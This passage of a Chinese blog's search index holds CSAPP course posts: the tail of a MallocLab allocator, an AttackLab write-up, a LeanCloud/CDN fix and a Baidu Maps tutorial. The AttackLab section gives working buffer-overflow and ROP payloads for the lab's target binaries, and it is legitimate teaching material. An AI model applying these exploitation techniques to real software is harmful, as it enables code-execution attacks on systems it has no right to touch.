//后继节点初始化\n    PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1));\n    return coalesce(bp);\n}\n\n/* \n * mm_malloc - Allocate a block by incrementing the brk pointer.\n *     Always allocate a block whose size is a multiple of the alignment.\n */\nvoid *mm_malloc(size_t size)\n{\n    size_t asize;\n    size_t extendsize;\n    char *bp;\n    if (size == 0)\n        return NULL;\n    if (size <= DSIZE)\n        asize = 2 * (DSIZE);\n    else\n        asize = (DSIZE) * ((size + (DSIZE) + (DSIZE - 1)) / (DSIZE));\n    if ((bp = find_fit(asize)) != NULL)\n    {\n        bp = place(bp, asize, 0);   //更新bp\n        return bp;\n    }\n    extendsize = MAX(asize, CHUNKSIZE);\n    if ((bp = extend_heap(extendsize / DSIZE)) == NULL)\n        return NULL;\n    bp = place(bp, asize, 0);       //更新bp\n    return bp;\n}\n\nstatic void *find_fit(size_t size)\n{\n    for (int i = judge(size); i < MAX_SIZE; i++)    //若查找不到依次向下一个下标移动\n    {\n        void *bp = root[i];     //空闲链表内部查找\n        while (bp != NULL)\n        {\n            if (size <= GET_SIZE(HDRP(bp)))\n                return bp;\n            bp = GET(SUCC(bp));\n        }\n    }\n    return NULL;\n}\n\nstatic void *place(void *bp, size_t asize, int flag)\n{\n    size_t csize = GET_SIZE(HDRP(bp));\n    if (!flag)          //malloc调用时需要relink，而realloc调用时不需要relink\n        relink(bp);\n    if ((csize - asize) >= (2 * DSIZE)) //空闲区域变为空闲块\n    {\n        //分割区间可在80字节~110字节之间浮动，对结果几乎无影响\n        if (asize < 96) //小于96字节\n        {\n            PUT(HDRP(bp), PACK(asize, 1));          //分配块置1\n            PUT(FTRP(bp), PACK(asize, 1));\n            bp = NEXT_BLKP(bp);\n            PUT(HDRP(bp), PACK(csize - asize, 0));  //空闲块置0\n            PUT(FTRP(bp), PACK(csize - asize, 0));\n            PUT(PRED(bp), 0);   //前驱初始化\n            PUT(SUCC(bp), 0);   //后继初始化\n            updatenode(bp);     //将空闲块插入空闲链表中\n            return PREV_BLKP(bp);   //返回分配块指针\n        }\n        else            //大于等于96字节\n        {\n            PUT(HDRP(bp), PACK(csize - asize, 0));  //空闲块置0\n            PUT(FTRP(bp), PACK(csize - asize, 0));\n            PUT(HDRP(NEXT_BLKP(bp)), PACK(asize, 1));   //分配块置1\n            PUT(FTRP(NEXT_BLKP(bp)), PACK(asize, 1));\n            PUT(PRED(bp), 0);   //前驱初始化\n            PUT(SUCC(bp), 0);   //后继初始化\n            updatenode(bp);     //将空闲块插入空闲链表中\n            return NEXT_BLKP(bp);   //返回分配块指针\n        }\n    }\n    else    //丢弃空闲区域\n    {\n        PUT(HDRP(bp), PACK(csize, 1));\n        PUT(FTRP(bp), PACK(csize, 1));\n        return bp;\n    }\n}\n/*\n * mm_free - Freeing a block does nothing.\n */\n\nvoid mm_free(void *ptr)\n{\n    size_t size = GET_SIZE(HDRP(ptr));\n    PUT(HDRP(ptr), PACK(size, 0));\n    PUT(FTRP(ptr), PACK(size, 0));\n    PUT(SUCC(ptr), 0);  //前驱初始化\n    PUT(PRED(ptr), 0);  //后继初始化\n    coalesce(ptr);\n}\n\nstatic void relink(void *bp)\n{\n    int index = judge(GET_SIZE(HDRP(bp)));\n    void *before = GET(PRED(bp));\n    void *after = GET(SUCC(bp));\n    if (before == NULL)             //头部插入\n    {\n        if (after != NULL)\n            PUT(PRED(after), 0);    //后块前驱置0\n        root[index] = after;        //空闲数组更新头部\n    }\n    else\n    {\n        if (after != NULL)\n            PUT(PRED(after), before);   //后块前驱更新\n        PUT(SUCC(before), after);   //前块后驱更新\n    }\n    PUT(PRED(bp), 0);   //前驱初始化\n    PUT(SUCC(bp), 0);   //后继初始化\n}\n\nstatic void *coalesce(void *bp)\n{\n    //所有情况一律选择先删除后插入节点\n    size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));\n    size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));\n    size_t size = GET_SIZE(HDRP(bp));\n    if (prev_alloc && !next_alloc)  //Case 2\n    {\n        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));\n        relink(NEXT_BLKP(bp));  //删除前面的空闲块\n        PUT(HDRP(bp), PACK(size, 0));\n        PUT(FTRP(bp), PACK(size, 0));\n    }\n    else if (!prev_alloc && next_alloc) //Case 3 \n    {\n        size += GET_SIZE(HDRP(PREV_BLKP(bp)));\n        relink(PREV_BLKP(bp));  //删除后面的空闲块\n        PUT(FTRP(bp), PACK(size, 0));\n        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));\n        bp = PREV_BLKP(bp);\n    }\n    else if (!prev_alloc && !next_alloc)    //Case 4 \n    {\n        size += GET_SIZE(FTRP(NEXT_BLKP(bp))) + GET_SIZE(HDRP(PREV_BLKP(bp)));\n        relink(PREV_BLKP(bp));  //删除前面的空闲块\n        relink(NEXT_BLKP(bp));  //删除后面的空闲块\n        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0));\n        PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0));\n        bp = PREV_BLKP(bp);\n    }\n    updatenode(bp); //插入新的空闲块\n    return bp;\n}\n\nstatic void updatenode(void *bp)\n{\n    void *now_root = root[judge(GET_SIZE(HDRP(bp)))];\n    char *prevp = NULL;\n    char *nextp = now_root;\n    //升序排列\n    while (nextp != NULL)\n    {\n        if (GET_SIZE(HDRP(nextp)) >= GET_SIZE(HDRP(bp)))\n            break;  //确定插入位置\n        prevp = nextp;\n        nextp = GET(SUCC(nextp));\n    }\n    if (prevp == NULL)  //头部插入\n    {\n        root[judge(GET_SIZE(HDRP(bp)))] = bp;\n        PUT(SUCC(bp), nextp);\n        PUT(PRED(bp), 0);\n        if (nextp != NULL)\n            PUT(PRED(nextp), bp);\n    }\n    else                //中间插入\n    {\n        PUT(SUCC(prevp), bp);\n        PUT(PRED(bp), prevp);\n        PUT(SUCC(bp), nextp);\n        if (nextp != NULL)\n            PUT(PRED(nextp), bp);\n    }\n}\n\n/*\n * mm_realloc - Implemented simply in terms of mm_malloc and mm_free\n */\nvoid *mm_realloc(void *ptr, size_t size)\n{\n    if (ptr == NULL)    //ptr == NULL 直接mm_malloc\n        return mm_malloc(size);\n    if (size == 0)      //size == 0 直接free\n    {\n        mm_free(ptr);\n        return NULL;\n    }\n    size_t asize;\n    size_t copySize = GET_SIZE(HDRP(ptr));\n    void *bp;\n    if (size <= DSIZE)  //8字节对齐\n        asize = 2 * (DSIZE);\n    else\n        asize = (DSIZE) * ((size + (DSIZE) + (DSIZE - 1)) / (DSIZE));\n    if (copySize >= asize)  //小于原ptr大小抛弃空闲区域直接返回\n        return ptr; \n    if (!GET_ALLOC(HDRP(NEXT_BLKP(ptr))) && !GET_SIZE(HDRP(NEXT_BLKP(NEXT_BLKP(ptr)))))\n    {\n        //判断后块是否为空闲块且空闲块是否为最后一块\n        size_t new_size = GET_SIZE(HDRP(ptr)) + GET_SIZE(HDRP(NEXT_BLKP(ptr)));\n        if (new_size < asize)   //大小不够需要进行扩展堆\n        {\n            if (extend_heap(MAX(asize - new_size, CHUNKSIZE) == NULL))\n                return NULL;    //扩展失败\n            new_size += MAX(asize - new_size, CHUNKSIZE);   //更新大小\n        }\n        relink(NEXT_BLKP(ptr)); //删除空闲块\n        PUT(HDRP(ptr), PACK(new_size, 1));  //更新原块大小\n        PUT(FTRP(ptr), PACK(new_size, 1));\n        return ptr;\n    }\n    //上述条件均不满足时选择原始方法\n    bp = mm_malloc(size);\n    memcpy(bp, ptr, size);\n    mm_free(ptr);\n    return bp;\n}\n```","tags":["CSAPP","深入理解计算机系统"],"categories":["计软杂谈"]},{"title":"CSAPP - AttackLab","url":"/reimu-lighthouse/20220619/csapp-attacklab/","content":"> - **缓冲区溢出**\n>     - 通过执行注入的代码，重写返回地址，执行另一个代码片段。\n> - **ROP攻击**\n>     - 随机化、将保存栈的内存区域设置为不可执行等技术使得缓冲区溢出攻击失效。这时可以通过现有程序中的代码而不是注入新的代码实现攻击。利用gadgets和string组成注入的代码，具体来说是使用pop和mov指令加上某些常数来执行特定的操作。\n\n## 实验要求\n- 实验分为5个阶段，level1-3是通过缓冲区溢出方式进行攻击，level4-5则是通过ROP攻击方式进行攻击。\n### 文件功能\n- cookie.txt:存放你攻击用的标识符\n- ctarget:执行code-injection攻击的程序\n- rtarget:执行return-oriented-programming攻击的程序\n- farm.c:gadget farm产生代码片段\n- hex2raw:生成攻击字符串\n其中，ctarget和rtarget会从标准输入读取字符串，保存在大小为BUFFER_SIZE的char数组中。\n## 前置任务\n- 对ctarget进行反汇编\n```shell\nobjdump -d ctarget > ctarget.txt\n```\n- 对rtarget进行反汇编\n```shell\nobjdump -d rtarget > rtarget.txt\n```\n- 确定getbuf的缓冲区大小\n![0](https://d-sketon.top/img/csapp-attacklab/0.png)\n778行可知getbuf开辟了40(0x28)字节的栈空间，即buffer为40字节\n## **level 1**\n\n> 不需要注入新的代码，只需要让程序重定向调用某个方法。\n\n```c\nvoid touch1()\n{\n    vlevel = 1;     /* Part of validation protocol */\n    printf(\"Touch1!: You called touch1()\\n\");\n    validate(1);\n    exit(0);\n}\n```\ntouch1函数中没有特别要求，只要运行进入该函数即可调用validate(1)\n所以只需输入字符串第40字节后为touch1函数的地址即可以覆盖掉原函数返回地址进入touch1\n- 查看汇编代码：\n![2](https://d-sketon.top/img/csapp-attacklab/2.png)\n\n答案为：\n```text\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\nc0 17 40 00 00 00 00 00    //小端输入\n```\n![e_1](https://d-sketon.top/img/csapp-attacklab/e_1.png)\n## **level 2**\n\n> 需要注入一段代码\n\n```c\nvoid touch2(unsigned val)\n{\n    vlevel = 2;     /* Part of validation protocol */\n    if (val == cookie) {\n        printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val);\n        validate(2);\n    } else {\n        printf(\"Misfire: You called touch2(0x%.8x)\\n\", val);\n        fail(2);\n    }\n    exit(0);\n}\n```\ntouch2中只有val==cookie后才能进入validate(2)，说明除了进入该函数外，val必须等于cookie\n- 查看汇编代码：\n![3](https://d-sketon.top/img/csapp-attacklab/3.png)\n%edi中存放val，0x202ce2(%rip)（即0x6044e4）存放cookie\n- 调用gdb：\n![4](https://d-sketon.top/img/csapp-attacklab/4.png)\n即%rdi需要修改为0x59b997fa\n所以需要在buffer中注入代码，而为了运行注入的代码，需要跳转回栈顶地址\n- 调用gdb：\n![5](https://d-sketon.top/img/csapp-attacklab/5.png)\n得到栈顶地址为0x5561dc78，即输入字符串第40字节后为0x5561dc78即可以覆盖掉原函数返回地址跳回栈顶运行注入的代码\n而注入的代码需要修改%rdi的内容并跳到touch2函数：\n```text\nmov $0x59b997fa %rdi        //将%rdi内容修改为cookie\npush $0x4017ec              //将touch2的地址push入栈中\nret                         //结束该函数，并返回上层函数返回地址\n\n//由于该代码是人为注入的，所以并不存在上层函数返回地址\n//而此时就会将刚入栈的0x4017ec作为返回地址，即跳到了touch2\n```\ngcc汇编并objdump反汇编后得到对应的16进制表示：\n![7](https://d-sketon.top/img/csapp-attacklab/7.png)\n- 将注入代码和跳转地址结合即为答案：\n```text\n48 c7 c7 fa 97 b9 59 68    //修改%rdi并跳到touch2\nec 17 40 00 c3 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n78 dc 61 55 00 00 00 00    //回到栈顶\n```\n![e_2](https://d-sketon.top/img/csapp-attacklab/e_2.png)\n## **level 3**\n\n> 需要传入字符串\n\n```c\n/* Compare string to hex represention of unsigned value */\nint hexmatch(unsigned val, char *sval)\n{\n    char cbuf[110];\n    /* Make position of check string unpredictable */\n    char *s = cbuf + random() % 100;\n    sprintf(s, \"%.8x\", val);\n    return strncmp(sval, s, 9) == 0;\n}\nvoid touch3(char *sval)\n{\n    vlevel = 3;     /*Part of validation protocol */\n    if (hexmatch(cookie, sval)) {\n        printf(\"Touch3!:You called touch3(\\\"%s\\\")\\n\", sval);\n        validate(3);\n    } else {\n        printf(\"Misfire:You called touch3(\\\"%s\\\")\\n\", sval);\n        fail(3);\n    }\n    exit(0);\n}\n```\ntouch3中只有hexmatch(cookie,sval)==1后才能进入validate(3)\n而hexmatch函数的作用为将cookie转成字符串并和sval比较，如果相等则返回1，说明除了需进入touch3函数外，*sval必须等于cookie的字符串形式\n- 查看汇编代码：\n![8](https://d-sketon.top/img/csapp-attacklab/8.png)\n%rsi（函数第二个参数）为char* sval，%edi为cookie，而877行将%rdi转入%rsi，说明初始状态下%rdi中存放着char* sval，即%rdi需要修改\n所以需要在buffer中注入代码，而为了运行注入的代码，同Phase 2 一样需要跳转回栈顶地址0x5561dc78\n![9](https://d-sketon.top/img/csapp-attacklab/9.png)\n注意到hexmatch函数中将%r12，%rbp，%rbx入栈，而这样会造成栈中原来输入的内容的覆盖\n![10](https://d-sketon.top/img/csapp-attacklab/10.png)\n（三次push分别改变了0x5561dc90,0x5561dc88,0x5561dc80中的内容）\n### 方法一\n由于原函数返回地址更低的地方（即0x5561dca8及原栈帧中更低的地方）并不会被覆盖\n所以可以将字符串（ASCII码形式）存入0x5561dca8并将sval指针（%rdi）置为0x5561dca8\nobjdump反汇编后代码：\n![11](https://d-sketon.top/img/csapp-attacklab/11.png)\n- 该方法答案：\n```text\n48 c7 c7 a8 dc 61 55 68\nfa 18 40 00 c3 00 00 00    //代码无需补足一字节\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n78 dc 61 55 00 00 00 00    //地址要补足一字节，否则segmentation fault\n35 39 62 39 39 37 66 61    //小端存储\n```\n### 方法二(最先尝试的方法）\n注意到0x5561dc88对应%rbp，0x5561dc90对应%r12，所以可以将字符串（ASCII码形式）存入%rbp，并将%r12清零（因为%r12中存着0x3，不清零会把3以ASCII码的形式打出来），将sval指针（%rdi）置为0x5561dc88，这样在hexmatch开头三次push后字符串就被存入了0x5561dc88中：\n![12](https://d-sketon.top/img/csapp-attacklab/12.png)\nobjdump反汇编后代码：\n![13](https://d-sketon.top/img/csapp-attacklab/13.png)\n- 该方法答案：\n```text\n48 c7 c7 88 dc 61 55 48 //修改%rdi\nbd 35 39 62 39 39 37 66 //%rbp注入字符串\n61 49 c7 c4 00 00 00 00 //%r12清零\n68 fa 18 40 00 c3 00 00 //touch3地址入栈\n00 00 00 00 00 00 00 00\n78 dc 61 55 00 00 00 00 //回到栈顶\n```\n![e_3](https://d-sketon.top/img/csapp-attacklab/e_3.png)\n\nROP攻击不同于先前的攻击代码注入（注入代码从栈顶写入），所有的gadget都应该从返回地址开始依次写入，而每段gadget运行完ret后都会依次进入下一个gadget\n## **level 4**\n由于该阶段要实现的效果和level 2一样，所以同样需要将%rdi内容修改为0x59b997fa并跳到touch2函数\n由于只能使用mov(Resigter to Register)，pop，ret和nop，所以不能直接将立即数转入寄存器中，而需要借助pop将栈中的立即数转入寄存器中\n查询farm，发现除了0x58（pop %rax）外没有0x59~0x5f有关能作为gadget的代码\n所以汇编代码只能为：\n```txt\npop         %rax        \nretq\nmovq        %rax,%rdi\nretq\n```\n查询farm可知pop %rax+ret可以用两种gadget表示：（0x90=nop，可以忽略）\n![14](https://d-sketon.top/img/csapp-attacklab/14.png \"0x4019ab\")\n![15](https://d-sketon.top/img/csapp-attacklab/15.png \"0x4019cc\")\nmovq %rax,%rdi+ret可以用两种gadget表示：（0x90=nop，可以忽略）\n![16](https://d-sketon.top/img/csapp-attacklab/16.png \"0x4019a2\")\n![17](https://d-sketon.top/img/csapp-attacklab/17.png \"0x4019c5\")\n而pop的内容（0x59b997fa）应该放在pop+retq指令之后，此时pop指令会将pop后对应位置的元素pop进对应的寄存器中\n而touch2函数地址（0x4017ec）应该放在movq+retq指令之后，当ret指令运行完毕后之后的地址会充当返回地址进入touch2函数\n- 答案：**（所有gadget应该填充至1字节，否则会segmentation fault）**\n```text\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00    \n00 00 00 00 00 00 00 00    //填充40字节\ncc 19 40 00 00 00 00 00    //pop %rax（或ab 19 40 00 00 00 00 00）\nfa 97 b9 59 00 00 00 00    //被pop的cookie\nc5 19 40 00 00 00 00 00    //movq %rax,%rdi（或a2 19 40 00 00 00 00 00）\nec 17 40 00 00 00 00 00    //返回地址\n```\n![e_4](https://d-sketon.top/img/csapp-attacklab/e_4.png)\n## **level 5**\n由于该阶段要实现的效果和Phase 3一样，所以同样需要将%rdi内容修改为cookie字符串对应地址并跳到touch3函数\n由于每次栈都是随机开辟，存入字符串的地址并不固定，所以不能直接把地址赋值给%rdi，而需要通过读取栈顶地址%rsp加上一定的偏移量来获得字符串地址\n而地址计算需要lea命令，查找farm：\n![18](https://d-sketon.top/img/csapp-attacklab/18.png)\n该命令正好可作为一个栈地址偏移的gadget，%rdi和%rsi一个为栈顶地址，一个为偏移量\n继续通过查找farm发现仅仅存在%eax->%edx->%ecx->%esi这样一条路径通过movl为%rdi赋值，而movl指令以寄存器作为目的时，会把该寄存器的高位4字节设置为0，即会损失高四字节的值。而栈顶地址经过gdb断点测试，都至少大于0x7ffffff00000：\n![19](https://d-sketon.top/img/csapp-attacklab/19.png)\n而偏移量肯定小于0xfffffffff，所以地址只能存入%rdi中，而把偏移量存入%rsi中\n此外由于偏移量必须为正数（高四字节置0），所以输入的字符串不能在前40个字节中（该位置地址比%rsp更小，且可能会被覆盖），只能在所有gadget之后写入（防止干扰栈中gadget）\n\n所以ROP整体思路为：\n1.将偏移量pop入%rax中\n2.movl指令将偏移量以该顺序：%eax->%edx->%ecx->%esi移入%rsi中\n3.movq指令将栈指针以该顺序：%rsp->%rax->%rdi移入%rdi中\n4.lea指令计算字符串地址\n5.计算结果%rax赋值给%rdi\n6.调用touch3\n\n汇编代码为：\n```text\npop %rax\nretq\n```\n![20](https://d-sketon.top/img/csapp-attacklab/20.png)\n```text\nmovl         %eax,%edx\nretq\n```\n![21](https://d-sketon.top/img/csapp-attacklab/21.png)\n```text\nmovl        %edx,%ecx\nretq\n```\n![22](https://d-sketon.top/img/csapp-attacklab/22.png)\n```text\nmovl         %ecx,%esi\nretq\n```\n![23](https://d-sketon.top/img/csapp-attacklab/23.png)\n```text\nmovq         %rsp,%rax\nretq\n```\n![24](https://d-sketon.top/img/csapp-attacklab/24.png)\n```text\nmovq         %rax,%rdi\nretq\n```\n![25](https://d-sketon.top/img/csapp-attacklab/25.png)\n```text\nlea         (%rdi,%rsi,1),%rax\nretq\n```\n![26](https://d-sketon.top/img/csapp-attacklab/26.png)\n```text\nmovq        %rax,%rdi\nretq\n```\n![27](https://d-sketon.top/img/csapp-attacklab/27.png)\n注意到每次ret后%rsp都会加0x8，%rax内的地址和末尾字符串地址之间的差等于(两者之间的命令个数+1)*8\n从movq %rsp,%rax算起有两个movq和一个lea，所以偏移量为(3+1)*8=32=0x20\n![28](https://d-sketon.top/img/csapp-attacklab/28.png)\n调用gdb发现输入的字符串之后的字节为0xf4f4f4f4f4f4f400，末尾两位为0，由于字符串是从右向左输出，所以0xf4f4f4f4f4f4f400不会输出多余字符，也就无需将该字节清零\n\n- 最终答案（答案不唯一）：\n```text\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00    //填充40字节\nab 19 40 00 00 00 00 00    //pop %rax\n20 00 00 00 00 00 00 00    //被pop的偏移量\n42 1a 40 00 00 00 00 00    //mov %eax,%edx\n34 1a 40 00 00 00 00 00 //mov %edx,%ecx\n27 1a 40 00 00 00 00 00    //mov %ecx,%esi\n06 1a 40 00 00 00 00 00    //mov %rsp,%rax\nc5 19 40 00 00 00 00 00    //mov %rax,%rdi\nd6 19 40 00 00 00 00 00    //lea (%rdi,%rsi,1),%rax\nc5 19 40 00 00 00 00 00    //mov %rax,%rdi\nfa 18 40 00 00 00 00 00    //touch3地址\n35 39 62 39 39 37 66 61    //字符串\n```\n![e_5](https://d-sketon.top/img/csapp-attacklab/e_5.png)","tags":["CSAPP","深入理解计算机系统"],"categories":["计软杂谈"]},{"title":"修复leancloud无法显示阅读次数","url":"/reimu-lighthouse/20220601/leancloud-recovery/","content":"本人近期打算修复一下一直无法使用的博客阅读次数。\nHexo-shoka主题所采用的是valine结合leancloud来记录每一篇博客的阅读次数，可不知道何时开始底下的阅读次数就始终为空。\n![01](https://d-sketon.top/img/leancloud/lean01.png)\n通过查看F12可以发现，md5.min.js，av-min.js均获取失败，而发起程序则是MiniValine.min.js。其原因在于近期jsdelivr的DNS发生了污染所致。\n![02](https://d-sketon.top/img/leancloud/lean02.png)\n可在这之前本人已经将博客内的jsdelivr均更换为了fastly镜像，可仍然发生了该异常，通过查看MiniValine.min.js可以发现在js内部引用了许多cdn.jsdelivr有关的资源。\n![03](https://d-sketon.top/img/leancloud/lean03.png)\n考虑将js文件下载到服务器，并对js进行魔改操作。\n\n将themes\\shoka\\scripts\\helpers中的\n```js\nlet result = vendorJs ? `<script src=\"//fastly.jsdelivr.net/combine/${vendorJs}\"></script>` : '';\nreturn vendorJs ? htmlTag('script', { src: `//fastly.jsdelivr.net/combine/${vendorJs}` }, '') : '';\n```\n修改为\n```js\nlet result = vendorJs ? `<script src=\"//d-sketon.top/combine/${vendorJs}\"></script>` : '';\nreturn vendorJs ? htmlTag('script', { src: `//d-sketon.top/combine/${vendorJs}` }, '') : '';\n```\nthemes\\shoka\\source\\js\\_app中的\n```js\nif(str.indexOf('npm')>-1||str.indexOf('gh')>-1||str.indexOf('combine')>-1)\n     return \"//fastly.jsdelivr.net/\" + str\n```\n修改为\n```js\nif(str.indexOf('npm')>-1||str.indexOf('gh')>-1||str.indexOf('combine')>-1)\n     return \"//d-sketon.top/\" + str\n```\n并在服务器上创建对应的js文件使用nginx进行URL映射，注意增加缓冲防止js被截断\n```text\nlocation  ^~/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist {\n          alias /var/www/cdn;\n          proxy_buffer_size 128k;\n          proxy_buffers   32 128k;\n          proxy_busy_buffers_size 128k;\n}\nlocation ^~/gh/amehime/MiniValine@4.2.2-beta10/dist {\n          alias /var/www/cdn;\n          proxy_buffer_size 128k;\n          proxy_buffers   32 128k;\n          proxy_busy_buffers_size 128k;\n}\nlocation  ^~/combine/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/justifiedGallery@3.8.1/dist/css {\n          alias /var/www/cdn;\n          proxy_buffer_size 128k;\n          proxy_buffers   32 128k;\n          proxy_busy_buffers_size 128k;\n}\nlocation  ^~/combine/npm/jquery@3.5.1/dist/jquery.min.js,npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js,npm/justifiedGallery@3.8.1/dist/js {\n          alias /var/www/cdn;\n          proxy_buffer_size 128k;\n          proxy_buffers   32 128k;\n          proxy_busy_buffers_size 128k;\n}\n```\n![07](https://d-sketon.top/img/leancloud/lean07.png)\n将MiniValine.min.js中所有的cdn.jsdelivr改为fastly.jsdelivr\n经过测试后发现md5.min.js，av-min.js均获取成功，且可以获得阅读次数，修复完成。\n![06](https://d-sketon.top/img/leancloud/lean06.png)","tags":["leancloud"],"categories":["计软杂谈"]},{"title":"百度地图API GL使用总结","url":"/reimu-lighthouse/20211224/baidumap-api/","content":"J2EE项目总结\n\n<!-- more -->\n\n- JavaScript API GL  v1.0是目前版本最新的百度地图API，相比于JavaScript API v3.0界面更加美观，功能更加强大。\n## 项目需求\n- 从后端读取起点和终点的地址，在地图上显示两者之间的路径。\n- 获得路径上所有点的坐标，用以显示卡车的虚拟位置。\n## 具体实现\n### 解析地址\n- 从官方文档中可以得到示例代码：\n```js\nvar map = new BMapGL.Map('container');\n//创建地址解析器实例\nvar myGeo = new BMapGL.Geocoder();\n// 将地址解析结果显示在地图上，并调整地图视野\nmyGeo.getPoint('北京市海淀区上地10街', function(point){\n    if(point){\n        map.centerAndZoom(point, 16);\n        map.addOverlay(new BMapGL.Marker(point, {title: '北京市海淀区上地10街'}))\n    }else{\n        alert('您选择的地址没有解析到结果！');\n    }\n}, '北京市')\n```\n- 分析代码可以得知：getPoint函数用以将地址字符串解析为Point，并通过回调函数进一步对Point进行处理。\n### 显示路径\n- 获得路径可以有多种选择，例如：驾车路线，步行路径，公交路径，骑行路径等等。百度也提供了货车路径的规划，但需要向百度递交申请，过程较为繁琐，所以最终考虑选择使用驾车路线规划。\n- 从官方文档中可以得到示例代码：\n```js\nvar map = new BMapGL.Map(\"container\");\nmap.centerAndZoom(new BMapGL.Point(116.404, 39.915), 11);\n\nvar p1 = new BMapGL.Point(116.301934,39.977552);\nvar p2 = new BMapGL.Point(116.508328,39.919141);\n\nvar driving = new BMapGL.DrivingRoute(map, {renderOptions:{map: map, autoViewport: true}});\ndriving.search(p1, p2);\n```\n- 分析代码可以得知：search函数用以获得p1，p2两个坐标之间的路径\n- 将以上两个示例代码结合可以很自然的想到以下代码：\n```js\n var map = new BMapGL.Map(\"container\");\nmap.centerAndZoom(new BMapGL.Point(116.404, 39.915), 11);\nvar myGeo = new BMapGL.Geocoder();\nvar p1,p2;\nmyGeo.getPoint('北京市海淀区上地10街', function (point) {\n  if (point) {\n    p1 = point;\n  } else {\n    alert('您选择的地址没有解析到结果！');\n  }\n})\nmyGeo.getPoint('北京市海淀区颐和园路5号', function (point) {\n  if (point) {\n    p2 = point;\n  } else {\n    alert('您选择的地址没有解析到结果！');\n  }\n})\nvar driving = new BMapGL.DrivingRoute(map, { renderOptions: { map: map, autoViewport: true } });\ndriving.search(p1, p2);\n```\n- 但实际上以上代码是不能运行的，在search函数被调用之前输出p1和p2可以发现两者都是undefined。这是因为getPoint函数其实是异步函数，执行顺序并非按照顺序执行，所以会导致无法对p1和p2赋值。所以改变策略，考虑使用函数嵌套的手段进行赋值：\n```js\nvar map = new BMapGL.Map(\"container\");\nmap.centerAndZoom(new BMapGL.Point(116.404, 39.915), 11);\nvar myGeo = new BMapGL.Geocoder();\nmyGeo.getPoint('北京市海淀区上地10街', function (point) {\n  if (point) {\n    var p1 = point;\n    myGeo.getPoint('北京市海淀区颐和园路5号', function (point) {\n      if (point) {\n        var p2 = point;\n        var driving = new BMapGL.DrivingRoute(map, { renderOptions: { map: map, autoViewport: true } });\n        driving.search(p1, p2);\n      } else {\n        alert('您选择的地址没有解析到结果！');\n      }\n    })\n  } else {\n    alert('您选择的地址没有解析到结果！');\n  }\n})\n```\n- 经测试，可以正常运行：\n![36](https://d-sketon.top/img/baidumap-api/36.png)\n### 获取坐标\n- 获得坐标在官方文档中并没有相关的代码供参考，所以只能自行解决。\n- 网络上许多和获取路径上坐标的代码多为：\n```js\ndriving.search(p1, p2);\nvar pts = driving.getResults().getPlan(0).getRoute(0).getPath();\n```\n- 但这实际上是无法运行的，会显示Cannot read property 'getPlan' of undefined：\n![37](https://d-sketon.top/img/baidumap-api/37.png)\n- 在查看了计算驾车距离和时间的相关示例代码后可以知道在DrivingRoute中参数renderOptions可以传入一个回调函数完成对route结果的处理，即：\n```js\nvar p2 = point;\nvar searchComplete = function (results) {\n  if (driving.getStatus() != BMAP_STATUS_SUCCESS) {\n    return;\n  }\n    //对结果的处理，可以使用getPlan函数了\n  var plan = results.getPlan(0).getRoute(0).getPath();\n}\nvar driving = new BMapGL.DrivingRoute(map, {\n  renderOptions: { map: map, autoViewport: true },\n  onSearchComplete: searchComplete,\n});\ndriving.search(p1, p2);\n```\n- 以上代码可以成功输出，返回结果为一个数组，包含路径上所有点的经纬度：\n![38](https://d-sketon.top/img/baidumap-api/38.png)\n- 可以使用Marker在地图上标注点的位置：\n```js\nvar marker1 = new BMapGL.Marker(new BMapGL.Point(plan[i].lng, plan[i].lat));\nmap.addOverlay(marker1);\n```\n## 完整代码\n```js\nfunction generateMap(sendAddress, receiveAddress, createTime, status) {\n    var map = new BMapGL.Map(\"container\");\n    var myGeo = new BMapGL.Geocoder();\n    myGeo.getPoint(sendAddress, function (point) {\n      if (point) {\n        var p1 = point;\n        map.centerAndZoom(point, 16);\n        myGeo.getPoint(receiveAddress, function (point) {\n          if (point) {\n            var p2 = point;\n            var searchComplete = function (results) {\n              if (driving.getStatus() != BMAP_STATUS_SUCCESS) {\n                return;\n              }\n              var plan = results.getPlan(0).getRoute(0).getPath();\n              if (status == \"ON_THE_WAY\") {\n                var len = plan.length - 1;\n                var now = parseInt(Date.now() / 1000);\n                var time1 = Date.parse(createTime) / 1000;\n                var i = parseInt((now - time1) / 259200 * len);\n                if (i > len) i = len;\n                var marker1 = new BMapGL.Marker(new BMapGL.Point(plan[i].lng, plan[i].lat));\n                map.addOverlay(marker1);\n              }\n            }\n            var driving = new BMapGL.DrivingRoute(map, {\n              renderOptions: { map: map, autoViewport: true },\n              onSearchComplete: searchComplete,\n            });\n            driving.search(p1, p2);\n          } else {\n            alert('收货地址没有解析到结果！');\n          }\n        })\n      } else {\n        alert('发货地址没有解析到结果！');\n      }\n    })\n    map.enableScrollWheelZoom(true);     //开启鼠标滚轮缩放\n    var scaleCtrl = new BMapGL.ScaleControl();  // 添加比例尺控件\n    map.addControl(scaleCtrl);\n    var zoomCtrl = new BMapGL.ZoomControl();  // 添加比例尺控件\n    map.addControl(zoomCtrl);\n    var navi3DCtrl = new 